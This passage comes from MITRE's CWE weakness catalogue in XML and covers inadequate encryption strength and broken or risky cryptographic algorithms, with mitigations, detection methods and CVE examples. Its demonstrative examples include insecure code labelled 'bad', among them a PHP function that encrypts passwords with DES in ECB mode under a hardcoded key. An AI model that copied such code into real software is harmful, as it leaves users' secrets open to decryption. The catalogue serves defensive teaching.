               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="68"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">Overlaps incomplete/missing security check.</Note>
            <Note Type="Relationship">Can be resultant.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Functional_Areas, Modes_of_Introduction, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="326" Name="Inadequate Encryption Strength" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The software stores or transmits sensitive data using an encryption scheme that is theoretically sound, but is not strong enough for the level of protection required.</Description>
         <Extended_Description>A weak encryption scheme can be subjected to brute force attacks that have a reasonable chance of succeeding using current attack methods and resources.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>An attacker may be able to decrypt the data using brute force attacks.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Use a cryptographic algorithm that is currently considered to be strong by experts in the field.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1546</Reference>
               <Description>Weak encryption</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1546</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2172</Reference>
               <Description>Weak encryption (chosen plaintext attack)</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2172</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1682</Reference>
               <Description>Weak encryption</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1682</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1697</Reference>
               <Description>Weak encryption produces same ciphertext from the same plaintext blocks.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1697</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1739</Reference>
               <Description>Weak encryption</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1739</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2281</Reference>
               <Description>Weak encryption scheme</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2281</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1872</Reference>
               <Description>Weak encryption (XOR)</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1872</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1910</Reference>
               <Description>Weak encryption (reversible algorithm).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1910</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1946</Reference>
               <Description>Weak encryption (one-to-one mapping).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1975</Reference>
               <Description>Encryption error uses fixed salt, simplifying brute force / dictionary attacks (overlaps randomness).</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1975</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Weak Encryption</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Cryptographic Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A9</Entry_ID>
               <Entry_Name>Insecure Communications</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="112"/>
            <Related_Attack_Pattern CAPEC_ID="20"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 21: Using the Wrong Cryptography.&#34; Page&#xA;                  315"/>
         </References>
         <Notes>
            <Note Type="Maintenance">A variety of encryption algorithms exist, with various weaknesses. This category could probably be split into smaller sub-categories.</Note>
            <Note Type="Maintenance">Relationships between CWE-310, CWE-326, and CWE-327 and all their children need to be reviewed and reorganized.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-08</Modification_Date>
               <Modification_Importance>Critical</Modification_Importance>
               <Modification_Comment>Clarified entry to focus on algorithms that do not have major weaknesses, but may not be strong enough for some purposes.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Maintenance_Notes, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2009-07-27">Weak Encryption</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="327" Name="Use of a Broken or Risky Cryptographic Algorithm" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The use of a broken or risky cryptographic algorithm is an unnecessary risk that may result in the exposure of sensitive information.</Description>
         <Extended_Description>The use of a non-standard algorithm is dangerous because a determined attacker may be able to break the algorithm and compromise whatever data has been protected. Well-known techniques may exist to break the algorithm.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="311" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:p>Cryptographic algorithms are the methods by which data is scrambled. There are a small number of well-understood and heavily studied algorithms that should be used by most applications. It is quite difficult to produce a secure algorithm, and even high profile algorithms by accomplished cryptographic experts have been broken.</xhtml:p>
               <xhtml:p>Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered "unsafe" even if it was once thought to be strong. This can happen when new attacks against the algorithm are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>The integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated methods may be useful for recognizing commonly-used libraries or features that have become obsolete.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>False negatives may occur if the tool is not aware of the cryptographic libraries in use, or if custom cryptography is being used.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary / Bytecode simple extractor – strings, ELF readers, etc.</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification.</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Design the software so that one cryptographic algorithm can be replaced with another. This will make it easier to upgrade to stronger algorithms.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These code examples use the Data Encryption Standard (DES).</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>EVP_des_ecb();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cipher des=Cipher.getInstance("DES...");<xhtml:br/>des.initEncrypt(key2);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>function encryptPassword($password){<xhtml:div style="margin-left:10px;">
                        <xhtml:div>$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);<xhtml:br/>$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);<xhtml:br/>$key = "This is a password encryption key";<xhtml:br/>$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);<xhtml:br/>return $encryptedPassword;</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-3775</Reference>
               <Description>Product uses "ROT-25" to obfuscate the password in the registry.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3775</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4150</Reference>
               <Description>product only uses "XOR" to obfuscate sensitive data</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5460</Reference>
               <Description>product only uses "XOR" and a fixed key to obfuscate sensitive data</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5460</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4860</Reference>
               <Description>Product substitutes characters with other characters in a fixed way, and also leaves certain input characters unchanged.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2058</Reference>
               <Description>Attackers can infer private IP addresses by dividing each octet by the MD5 hash of '20'.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3188</Reference>
               <Description>Product uses DES when MD5 has been specified in the configuration, resulting in weaker-than-expected password hashes.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3188</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2946</Reference>
               <Description>Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6013</Reference>
               <Description>Product uses the hash of a hash for authentication, allowing attackers to gain privileges if they can obtain the original hash.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6013</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using a broken or risky cryptographic algorithm</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Java Secure Coding">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="20"/>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="608"/>
            <Related_Attack_Pattern CAPEC_ID="614"/>
            <Related_Attack_Pattern CAPEC_ID="97"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-280"/>
            <Reference External_Reference_ID="REF-281"/>
            <Reference External_Reference_ID="REF-282"/>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-284"/>
            <Reference External_Reference_ID="REF-112" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 21: Using the Wrong Cryptography.&#34; Page&#xA;                  315"/>
            <Reference External_Reference_ID="REF-287"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Insufficient or Obsolete Encryption&#34;, Page&#xA;                  44."/>
         </References>
         <Notes>
            <Note Type="Maintenance">Relationships between CWE-310, CWE-326, and CWE-327 and all their children need to be reviewed and reorganized.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
